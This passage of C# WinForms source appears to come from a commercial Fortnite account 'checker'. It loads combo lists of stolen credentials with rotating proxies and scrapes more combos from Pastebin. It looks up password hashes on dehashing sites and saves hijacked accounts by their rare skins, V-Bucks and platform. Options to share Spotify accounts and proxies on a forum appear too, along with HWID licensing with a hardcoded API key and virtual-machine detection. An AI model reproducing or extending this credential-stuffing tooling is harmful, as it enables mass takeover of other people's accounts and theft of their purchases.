            nsButton17.Enabled = false;
            nsButton18.Enabled = false;
            NameCheck.Enabled = false;
            NameResults.Enabled = false;
            NameResults.Enabled = false;
            nsButton16.Enabled = false;
            nsButton21.Enabled = false;
            nsButton19.Enabled = false;
            nsButton20.Enabled = false;
            DisableCounterStats.Checked = false;
            DisableValidImageChange.Checked = false;
            CheckAccountInfo.Checked = false;
            DisableCounterStats.Enabled = false;
            DisableValidImageChange.Enabled = false;
            CheckAccountInfo.Enabled = false;
            IncrementSaveSkins.Checked = false;
            IncrementSaveSkins.Enabled = false;
            ShowBannedProxies.Checked = true;
            ShowBannedProxies.Enabled = false;
            ShowValidProxies.Checked = true;
            ShowValidProxies.Enabled = false;
            SaveValidProxies.Checked = false;
            SaveValidProxies.Enabled = false;
            SaveBadProxies.Checked = false;
            SaveBadProxies.Enabled = false;
            LoadCombosProxyButton.Enabled = false;
            nsButton26.Enabled = false;
            ComboSorterTextBox1.Enabled = false;
            ComboSorterTextBox2.Enabled = false;
            ComboSorterTextBox3.Enabled = false;
            ComboSorterTextBox4.Enabled = false;
            ComboSorterTextBox5.Enabled = false;
            ComboSorterTextBox6.Enabled = false;
            ComboSorterTextBox7.Enabled = false;
            ComboSorterTextBox8.Enabled = false;
            nsButton23.Enabled = false;
            nsButton25.Enabled = false;
            nsButton24.Enabled = false;
            LoadSettingsButtonHe.Enabled = false;
            ComboSplitter_LoadList.Enabled = false;
            ComboSplitter_Start.Enabled = false;
            ComboSplitterNumber.Enabled = false;
            NewProxiesSaveValid.Enabled = false;
            NewProxiesSaveInValid.Enabled = false;
            nsButton27.Enabled = false;
            StartChecking.Enabled = false;
            StopCheckingProxyAlive.Enabled = false;
            RegularProxyCheckURLToCheck.Enabled = false;
            AutoSaveRegularProxies.Enabled = false;
            SaveValidProxiesBannedChecker.Enabled = false;
            SaveinValidProxiesBannedChecker.Enabled = false;
            LoadProxyBanCheck.Enabled = false;
            BtnStartProxies.Enabled = false;
            StopCheckingBanProxy.Enabled = false;
            ShareUnbannedProxiesOnTheForum.Enabled = false;
            ShareSpotifyAccountsOnForum.Enabled = false;
            TellStatsButton.Enabled = false;
            SpotifyCheckerLoadCombos.Enabled = false;
            SpotifyCheckerStart.Enabled = false;
            nsButton28.Enabled = false;
            ComboSorterTextBox1.Text = "";
            ComboSorterTextBox2.Text = "";
            ComboSorterTextBox3.Text = "";
            ComboSorterTextBox4.Text = "";
            ComboSorterTextBox5.Text = "";
            ComboSorterTextBox6.Text = "";
            ComboSorterTextBox7.Text = "";
            ComboSorterTextBox8.Text = "";
            ComboSplitterNameOutput.Text = "";
            AutoSaveRegularProxies.Checked = false;
            SearchForContentButton.Text = "";
            SearchForContentButton.Enabled = false;
            nsButton37.Enabled = false;
            nsButton38.Enabled = false;
            nsButton39.Enabled = false;
            ExtractCombosLoadFile.Enabled = false;
            SaveExtractedList.Enabled = false;
            ReturnedPastebinLinks.Enabled = false;
            LeecherKeyWords.Enabled = false;
            LeecherStart.Enabled = false;
            LeecherStop.Enabled = false;
            LeecherRemoveDupeLinks.Enabled = false;
            LeecherCombos.Enabled = false;
            LeecherGrabCombos.Enabled = false;
            LeecherRemoveDupedCombos.Enabled = false;
            LeechedCombosSave.Enabled = false;
            ChooseTimeFrameScraper.Enabled = false;
            ProxyLeecherChooseProxies.Enabled = false;
            LoadProxiesComboLeecher.Enabled = false;
            ReturnStringParse.Enabled = false;
            RandomizerDisableAutoScroller.Checked = true;
            RandomizerDisableAutoScroller.Enabled = false;
            DisableAutoScrollerForComboextractorKekLongestNameInTheDamnWorldHaha.Checked = true;
            DisableAutoScrollerForComboextractorKekLongestNameInTheDamnWorldHaha.Enabled = false;
            nsButton40.Enabled = false;
            MergeTheFiles.Enabled = false;
            FileMergerFilesToAdd.Enabled = false;
            FinalFileLineCountMerger.Enabled = false;
            LoadInHashesButton.Enabled = false;
            nsButton41.Enabled = false;
            DehashedSuccessfully.Enabled = false;
            DehashedFailed.Enabled = false;
            HashCheckerhashtoolkit.Enabled = false;
            HashCheckleakz.Enabled = false;
            HashChecknitrxgennet.Enabled = false;
            HashDecryptmd5decryptnet.Enabled = false;
            HashCheckerhashtoolkit.Checked = false;
            HashCheckleakz.Checked = false;
            HashChecknitrxgennet.Checked = false;
            HashDecryptmd5decryptnet.Checked = false;
            IsPremiumUser = "False";
        }


        private void MainThreadCheckHWID()
        {
            try
            {
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.KeepAlive = true;
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.ConnectTimeout = 10000;
                    httpRequest.AllowAutoRedirect = false;
                    string GetUserIDInformation = httpRequest.Get("https://tcm.tools/api/core/members/" + SavedProfileID + "?key=2c20e59c8e2050b61cef2fe9d0f2c66f").ToString();
                    JToken GetHWID = JObject.Parse(GetUserIDInformation)["customFields"]["3"]["fields"]["3"]["value"];
                    if (GetHWID.ToString() == "" || GetHWID.ToString() == null)
                    {
                        NoneVIPAccess();
                        MessageBox.Show("Your HWID Does Not Match The One On Your Profile, Please Note This Check Is Done Regularly To Stop Sharing Of Acounts!");
                        Process.GetCurrentProcess().Kill();
                    }
                    if (GetHWID.ToString() != FinalEncrypt)
                    {
                        NoneVIPAccess();
                        MessageBox.Show("Your HWID Does Not Match The One On Your Profile, Please Note This Check Is Done Regularly To Stop Sharing Of Acounts!");
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }
            catch
            {

            }
        }


        private void CheckForHWIDChange()
        {
            Thread StartCheckingAccountHWID = new Thread(MainThreadCheckHWID);
            CheckForIllegalCrossThreadCalls = false;
            StartCheckingAccountHWID.Start();
            Thread.Sleep(180000);
            CheckForHWIDChange();
        }



        private void VIPLogin()
        {
            Thread StartCheckingAccountHWID = new Thread(CheckForHWIDChange);
            CheckForIllegalCrossThreadCalls = false;
            StartCheckingAccountHWID.Start();
        }


        public class CookieWebClient : WebClient
        {
            private CookieContainer cookie = new CookieContainer();

            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest request = base.GetWebRequest(address);
                if (request is HttpWebRequest)
                {
                    (request as HttpWebRequest).CookieContainer = cookie;
                }
                return request;
            }
        }

        public static bool isVirtualMachine()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Process.Start("https://rocketr.net/buy/80c4c52a48b1");
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://rocketr.net/buy/80c4c52a48b1");
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Process.Start("https://cash.me/app/TKSQQFD");
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.instagram.com/TrynCatchMeh/");
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            if(!CanSeeDiscord)
            {
                MessageBox.Show("Must be logged in to get discord link.");
                return;
            }
            try
            {
                string MethodDiscord = new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/Discord/Method.txt");
                string NEwDiscordUrl = new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/Discord/DiscordURL.txt");
                if (MethodDiscord == "2")
                {
                    Process.Start(NEwDiscordUrl);
                }
                else
                {
                    Process.Start("https://discord.gg/zjmVUxK");
                }
            }
            catch
            {
                try
                {
                    MessageBox.Show("Error grabbing most recent invite for discord, Will open last one...");
                    Process.Start("https://discord.gg/zjmVUxK");
                }
                catch
                {
                    MessageBox.Show("ERROR LOADING URL, CONTACT TCM");
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                elapsedTime = DateTime.Now - startTime;
                TotalTime.Text = elapsedTime.ToString();
            }
            catch
            {
                MessageBox.Show("An Error Has Occured, Please Message TrynCatchMeh On Instagram with error code: 88053");
            }
        }

        private void btnCombo_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void btnCombo_DragDrop(object sender, DragEventArgs e)
        {
            Combo.Clear();
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop, true);
            foreach (string file in files)
            {

                try
                {
                    using (StreamReader streamReader = new StreamReader(file))
                    {
                        while (streamReader.Peek() != -1)
                            Combo.Add(streamReader.ReadLine());
                    }
                    btnCombo.Text = string.Format("Combo List ({0})", Combo.Count.ToString());
                    btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count.ToString());
                    fileName = Path.GetFileNameWithoutExtension(file);
                }
                catch
                {
                    return;
                }
            }
        }

        private void btnProxy_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void btnProxy_DragDrop(object sender, DragEventArgs e)
        {
            Proxies.Clear();
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop, true);
            foreach (string file in files)
            {

                try
                {
                    using (StreamReader streamReader = new StreamReader(file))
                    {
                        while (streamReader.Peek() != -1)
                            Proxies.Add(streamReader.ReadLine());
                    }
                    btnCombo.Text = string.Format("Combo List ({0})", Combo.Count.ToString());
                    btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count.ToString());
                    fileName = Path.GetFileNameWithoutExtension(file);
                }
                catch
                {
                    return;
                }
            }
        }

        private void btnCombo_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
            btnCombo.Text = string.Format("Combo List ({0})", Combo.Count.ToString());
            btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count.ToString());
        }

        private void BlackKnightSaveFile_CheckedChanged(object sender)
        {
            if (BlackKnightSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB1"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB1"] = "False";
                Settings.Default.Save();
            }
        }

        private void CodenameELFSaveFile_CheckedChanged(object sender)
        {
            if (CodenameELFSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB2"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB2"] = "False";
                Settings.Default.Save();
            }
        }

        private void CrackshotSaveFile_CheckedChanged(object sender)
        {
            if (CrackshotSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB3"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB3"] = "False";
                Settings.Default.Save();
            }
        }

        private void GhoulTrooperSaveFile_CheckedChanged(object sender)
        {
            if (GhoulTrooperSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB4"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB4"] = "False";
                Settings.Default.Save();
            }
        }

        private void GingerGunnerSaveFile_CheckedChanged(object sender)
        {
            if (GingerGunnerSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB5"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB5"] = "False";
                Settings.Default.Save();
            }
        }

        private void MerryMarauderSaveFile_CheckedChanged(object sender)
        {
            if (MerryMarauderSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB6"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB6"] = "False";
                Settings.Default.Save();
            }
        }

        private void NogOpsSaveFile_CheckedChanged(object sender)
        {
            if (NogOpsSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB7"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB7"] = "False";
                Settings.Default.Save();
            }
        }

        private void RedNosedRaiderSaveFile_CheckedChanged(object sender)
        {
            if (RedNosedRaiderSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB8"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB8"] = "False";
                Settings.Default.Save();
            }
        }

        private void SkullTrooperSaveFile_CheckedChanged(object sender)
        {
            if (SkullTrooperSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB9"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB9"] = "False";
                Settings.Default.Save();
            }
        }

        private void YuletideRangerSaveFile_CheckedChanged(object sender)
        {
            if (YuletideRangerSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB10"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB10"] = "False";
                Settings.Default.Save();
            }
        }

        private void ScytheSaveFile_CheckedChanged(object sender)
        {
            if (ScytheSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB11"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB11"] = "False";
                Settings.Default.Save();
            }
        }

        private void STWSaveFile_CheckedChanged(object sender)
        {
            if (STWSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB12"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB12"] = "False";
                Settings.Default.Save();
            }
        }

        private void VbucksSaveFile_CheckedChanged(object sender)
        {
            if (VbucksSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB13"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB13"] = "False";
                Settings.Default.Save();
            }
        }

        private void SaveUselessAccounts_CheckedChanged(object sender)
        {
            if (SaveUselessAccounts.Checked)
            {
                Properties.Settings.Default["SaveCB14"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB14"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForRareItems_CheckedChanged(object sender)
        {
            if (CheckForRareItems.Checked)
            {
                Properties.Settings.Default["SaveCB15"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB15"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForSkins_CheckedChanged(object sender)
        {
            if (CheckForSkins.Checked)
            {
                Properties.Settings.Default["SaveCB16"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB16"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForAxes_CheckedChanged(object sender)
        {
            if (CheckForAxes.Checked)
            {
                Properties.Settings.Default["SaveCB17"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB17"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForBackBling_CheckedChanged(object sender)
        {
            if (CheckForBackBling.Checked)
            {
                Properties.Settings.Default["SaveCB18"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB18"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForGliders_CheckedChanged(object sender)
        {
            if (CheckForGliders.Checked)
            {
                Properties.Settings.Default["SaveCB19"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB19"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForDances_CheckedChanged(object sender)
        {
            if (CheckForDances.Checked)
            {
                Properties.Settings.Default["SaveCB20"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB20"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForEmojis_CheckedChanged(object sender)
        {
            if (CheckForEmojis.Checked)
            {
                Properties.Settings.Default["SaveCB21"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB21"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForLoadingScreens_CheckedChanged(object sender)
        {
            if (CheckForLoadingScreens.Checked)
            {
                Properties.Settings.Default["SaveCB22"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB22"] = "False";
                Settings.Default.Save();
            }
        }

        private void MainFormTheme_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                ChangeImage();
            }
            catch
            {

            }
        }

        private void ChangeImage()
        {
            if (!DisableValidImageChange.Checked)
            {
                try
                {
                    string[] mystrings = imageurls.Split('|');
                    string blah1 = mystrings[randomimage.Next(mystrings.Length)];
                    ShitNiteImage.ImageLocation = blah1;
                }
                catch
                {
                    string[] mystrings = "https://tcmtools.com/Checker/Backgrounds/bg1.jpg|https://tcmtools.com/Checker/Backgrounds/bg2.jpg|https://tcmtools.com/Checker/Backgrounds/bg3.jpg|https://tcmtools.com/Checker/Backgrounds/bg4.jpg|https://tcmtools.com/Checker/Backgrounds/bg5.jpg|https://tcmtools.com/Checker/Backgrounds/bg6.jpg|https://tcmtools.com/Checker/Backgrounds/bg7.jpg|https://tcmtools.com/Checker/Backgrounds/bg8.jpg|https://tcmtools.com/Checker/Backgrounds/bg9.jpg|https://tcmtools.com/Checker/Backgrounds/bg10.jpg|https://tcmtools.com/Checker/Backgrounds/bg11.jpg|https://tcmtools.com/Checker/Backgrounds/bg12.jpg|https://tcmtools.com/Checker/Backgrounds/bg13.jpg|https://tcmtools.com/Checker/Backgrounds/bg14.jpg|https://tcmtools.com/Checker/Backgrounds/bg15.jpg|https://tcmtools.com/Checker/Backgrounds/bg16.jpg|https://tcmtools.com/Checker/Backgrounds/bg17.jpg|https://tcmtools.com/Checker/Backgrounds/bg18.jpg|https://tcmtools.com/Checker/Backgrounds/bg19.jpg|https://tcmtools.com/Checker/Backgrounds/bg20.jpg|https://tcmtools.com/Checker/Backgrounds/bg21.jpg|https://tcmtools.com/Checker/Backgrounds/bg22.jpg|https://tcmtools.com/Checker/Backgrounds/bg23.jpg|https://tcmtools.com/Checker/Backgrounds/bg24.jpg|https://tcmtools.com/Checker/Backgrounds/bg24.jpg|https://tcmtools.com/Checker/Backgrounds/bg26.jpg|https://tcmtools.com/Checker/Backgrounds/bg27.jpg|https://tcmtools.com/Checker/Backgrounds/bg28.jpg|https://tcmtools.com/Checker/Backgrounds/bg29.jpg|https://tcmtools.com/Checker/Backgrounds/bg30.jpg|https://tcmtools.com/Checker/Backgrounds/bg31.jpg|https://tcmtools.com/Checker/Backgrounds/bg32.jpg|https://tcmtools.com/Checker/Backgrounds/bg33.jpg".Split('|');
                    string blah1 = mystrings[randomimage.Next(mystrings.Length)];
                    ShitNiteImage.ImageLocation = blah1;
                }
            }
        }

        private void DisableNotify_CheckedChanged(object sender)
        {
            if (DisableNotify.Checked)
            {
                Properties.Settings.Default["SaveCB23"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB23"] = "False";
                Settings.Default.Save();
            }
        }


        public static string path2;
        private void ShitNiteImage_Click(object sender, EventArgs e)
        {
            if (FnBattleRoyalLB.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid info before saving nothing, Crack head :D");
                return;
            }
            try
            {
                saveFileDialog2.FileName = "TCMsSkinCheckerOutput.txt";
                saveFileDialog2.Filter = "Text File | *.txt";
                if (saveFileDialog2.ShowDialog() == DialogResult.OK)
                {
                    path2 = saveFileDialog2.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }

            try

            {
                using (StreamWriter sr = File.CreateText(path2))
                {
                    foreach (string s in FnBattleRoyalLB.Items)
                    {
                        sr.WriteLine(s);
                    }
                }
            }
            catch
            {
                MessageBox.Show("ERROR: You must choose a path to save to.");
            }
        }

        private void DisableSounds_CheckedChanged(object sender)
        {
            if (DisableSounds.Checked)
            {
                Properties.Settings.Default["SaveCB24"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB24"] = "False";
                Settings.Default.Save();
            }
        }

        private void FastCheck_CheckedChanged(object sender)
        {

        }

        private void PCSaveFile_CheckedChanged(object sender)
        {
            if (PCSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB25"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB25"] = "False";
                Settings.Default.Save();
            }
        }

        private void PS4SaveFile_CheckedChanged(object sender)
        {
            if (PS4SaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB26"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB26"] = "False";
                Settings.Default.Save();
            }
        }

        private void XboxSaveFile_CheckedChanged(object sender)
        {
            if (XboxSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB27"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB27"] = "False";
                Settings.Default.Save();
            }
        }

        private void NintendoSaveFile_CheckedChanged(object sender)
        {
            if (NintendoSaveFile.Checked)
            {
                Properties.Settings.Default["SaveCB28"] = "True";
                Properties.Settings.Default["SaveCB28"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB28"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForOtherInformation_CheckedChanged(object sender)
        {
            if (CheckForOtherInformation.Checked)
            {
                Properties.Settings.Default["SaveCB29"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB29"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForBattlePassInformation_CheckedChanged(object sender)
        {
            if (CheckForBattlePassInformation.Checked)
            {
                Properties.Settings.Default["SaveCB30"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB30"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForPastSeasonInformation_CheckedChanged(object sender)
        {
            if (CheckForPastSeasonInformation.Checked)
            {
                Properties.Settings.Default["SaveCB31"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB31"] = "False";
                Settings.Default.Save();
            }
        }

        private void CeckForLast5Purchases_CheckedChanged(object sender)
        {
            if (CeckForLast5Purchases.Checked)
            {
                Properties.Settings.Default["SaveCB32"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB32"] = "False";
                Settings.Default.Save();
            }
        }

        private void CheckForTotalItemCount_CheckedChanged(object sender)
        {
            if (CheckForTotalItemCount.Checked)
            {
                Properties.Settings.Default["SaveCB33"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB33"] = "False";
                Settings.Default.Save();
            }
        }

        private void StackedSkinSaver_CheckedChanged(object sender)
        {
            if (StackedSkinSaver.Checked)
            {
                Properties.Settings.Default["SaveCB34"] = "True";
                Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default["SaveCB34"] = "False";
                Settings.Default.Save();
            }
        }

        private void ShitNiteImage_DoubleClick(object sender, EventArgs e)
        {

        }


        private void nsButton6_Click(object sender, EventArgs e)
        {
            if (APIText.Text.Contains("API.php"))
            {
                Settings.Default["APIURL"] = APIText.Text;
                Settings.Default.Save();
            }
            else
            {
                MessageBox.Show("URL Must Contain The API.php File In The URL");
            }
        }

        private void APISender_CheckedChanged(object sender)
        {
            if (APIText.Text.Contains("API.php"))
            {
                if (APISender.Checked)
                {
                    Properties.Settings.Default["SaveCB35"] = "True";
                    Settings.Default.Save();
                }
                else
                {
                    Properties.Settings.Default["SaveCB35"] = "False";
                    Settings.Default.Save();
                }
            }
            else
            {
                APIText.Text = "URL Must Contain API.php";
            }
        }

        private void APIDLButton_Click(object sender, EventArgs e)
        {
            Process.Start("http://tcmtools.com/CheckerStuff/api/API.zip");
        }

        public string getCountry(string ip)
        {
            string Country = "";
            GeoIP geox = new GeoIP();
            Country = geox.LookupCountryName(ip);
            return Country;
        }
        public class GeoIP
        {
            public MemoryStream MS;
            string res = "GeoIP.dat";
            private static long CountryBegin = 16776960;
            private static string[] CountryName = new[] { "Unknown", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Netherlands Antilles", "Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the", "Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands", "France", "France, Metropolitan", "Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece", "South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau", "Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands", "Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libyan Arab Jamahiriya", "Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia, the Former Yugoslav Republic of", "Mali", "Myanmar", "Mongolia", "Macao", "Northern Mariana Islands", "Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway", "Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn", "Puerto Rico", "Palestinian Territory, Occupied", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", "Tuvalu", "Taiwan, Province of China", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands", "United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines", "Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte", "Yugoslavia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy", "Satellite Provider", "Other", "Aland Islands", "Guernsey", "Isle of Man", "Jersey", "Saint Barthelemy", "Saint Martin" };
            private static string[] CountryCode = new[] { "--", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB", "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "SAU", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX", "GG", 